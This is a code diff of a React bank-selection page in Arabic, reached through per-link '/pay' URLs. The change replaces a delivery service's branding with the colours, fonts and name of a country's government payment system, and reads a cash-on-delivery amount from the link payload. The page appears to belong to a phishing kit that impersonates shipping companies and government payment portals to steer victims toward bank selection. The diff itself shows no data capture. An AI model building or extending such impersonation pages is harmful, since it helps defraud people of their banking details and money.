@@ -7,8 +7,10 @@ import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
+import { formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -22,8 +24,11 @@ const PaymentBankSelector = () => {
   const [loadingBanks, setLoadingBanks] = useState(false);
   
   // Get country from link data
-  const countryCode = linkData?.country_code || "";
+  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
+  
+  // Get government payment system
+  const govSystem = getGovernmentPaymentSystem(countryCode);
   
   // Get preselected bank from link payload if available
   const preselectedBank = linkData?.payload?.selected_bank;
@@ -36,8 +41,8 @@ const PaymentBankSelector = () => {
   
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  // Get amount from link data - prioritize saved amount
+  const rawAmount = shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -52,7 +57,9 @@ const PaymentBankSelector = () => {
     }
   }
 
-  const formattedAmount = `${amount} ر.س`;
+  // Get saved currency code
+  const currencyCode = shippingInfo?.currency_code || countryData?.currency || "SAR";
+  const formattedAmount = formatCurrency(amount, currencyCode);
   
   // Load banks when country is available from link data
   useEffect(() => {
@@ -132,12 +139,12 @@ const PaymentBankSelector = () => {
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+          background: govSystem.colors.surface
         }}
       >
         <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
-          <p className="text-muted-foreground">جاري تحميل البيانات...</p>
+          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
+          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
         </div>
       </div>
     );
@@ -162,7 +169,7 @@ const PaymentBankSelector = () => {
       className="min-h-screen py-4 sm:py-12 bg-background" 
       dir="rtl"
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        background: govSystem.colors.surface
       }}
     >
       <div className="container mx-auto px-4 max-w-2xl">
@@ -170,7 +177,8 @@ const PaymentBankSelector = () => {
         <div className="mb-6">
           <button
             onClick={() => navigate(`/pay/${id}/details`)}
-            className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
+            className="flex items-center gap-2 text-sm mb-4"
+            style={{ color: govSystem.colors.textLight }}
           >
             <ArrowLeft className="w-4 h-4" />
             <span>رجوع</span>
@@ -180,15 +188,15 @@ const PaymentBankSelector = () => {
             <div
               className="w-12 h-12 rounded-full flex items-center justify-center"
               style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                background: govSystem.gradients.primary,
               }}
             >
               <Building2 className="w-6 h-6 text-white" />
             </div>
             <div>
-              <h1 className="text-2xl font-bold">اختر البنك</h1>
-              <p className="text-sm text-muted-foreground">
-                {serviceName} - {formattedAmount}
+              <h1 className="text-2xl font-bold" style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}>اختر البنك</h1>
+              <p className="text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
+                {govSystem.nameAr} - {formattedAmount}
               </p>
             </div>
           </div>
@@ -197,8 +205,15 @@ const PaymentBankSelector = () => {
         {/* Country Badge */}
         {countryData && (
           <div className="mb-4">
-            <Badge variant="secondary" className="text-sm">
-              {countryData.flag} {countryData.nameAr}
+            <Badge 
+              className="text-sm px-3 py-1.5"
+              style={{ 
+                background: govSystem.gradients.primary,
+                color: govSystem.colors.textOnPrimary,
+                fontFamily: govSystem.fonts.primaryAr
+              }}
+            >
+              {countryData.flag} {countryData.nameAr} - {govSystem.nameAr}
             </Badge>
           </div>
         )}
@@ -206,14 +221,22 @@ const PaymentBankSelector = () => {
         {/* Loading Banks */}
         {loadingBanks ? (
           <div className="text-center py-12">
-            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
-            <p className="text-muted-foreground">جاري تحميل البنوك...</p>
+            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
+            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
           </div>
         ) : banks.length === 0 ? (
-          <Card className="p-8 text-center">
-            <Building2 className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
-            <p className="text-muted-foreground mb-4">لا توجد بنوك متاحة لهذه الدولة</p>
-            <Button onClick={handleSkip} variant="outline">
+          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
+            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
+            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
+            <Button 
+              onClick={handleSkip} 
+              variant="outline"
+              style={{ 
+                borderColor: govSystem.colors.primary,
+                color: govSystem.colors.primary,
+                fontFamily: govSystem.fonts.primaryAr
+              }}
+            >
               متابعة بدون تحديد بنك
             </Button>
           </Card>
@@ -226,11 +249,14 @@ const PaymentBankSelector = () => {
                   key={bank.id}
                   className={`p-4 cursor-pointer transition-all hover:shadow-md ${
                     selectedBank === bank.id
-                      ? 'ring-2 bg-primary/5'
+                      ? 'ring-2'
                       : 'hover:bg-accent/50'
                   }`}
                   style={{
-                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
+                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : govSystem.colors.border,
+                    backgroundColor: selectedBank === bank.id ? `${govSystem.colors.primary}05` : undefined,
+                    borderRadius: govSystem.borderRadius.md,
+                    borderWidth: selectedBank === bank.id ? '2px' : '1px'
                   }}
                   onClick={() => handleBankSelect(bank.id)}
                 >
@@ -239,20 +265,21 @@ const PaymentBankSelector = () => {
                       className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                       style={{
                         background: selectedBank === bank.id
-                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                          ? govSystem.gradients.primary
                           : '#64748b',
+                        fontFamily: govSystem.fonts.primaryAr
                       }}
                     >
                       {bank.nameAr.charAt(0)}
                     </div>
                     <div className="flex-1">
-                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
-                      <p className="text-xs text-muted-foreground">{bank.name}</p>
+                      <h3 className="font-semibold text-sm" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>{bank.nameAr}</h3>
+                      <p className="text-xs" style={{ color: govSystem.colors.textLight }}>{bank.name}</p>
                     </div>
                     {selectedBank === bank.id && (
                       <div
                         className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: branding.colors.primary }}
+                        style={{ backgroundColor: govSystem.colors.primary }}
                       >
                         <svg
                           className="w-3 h-3 text-white"
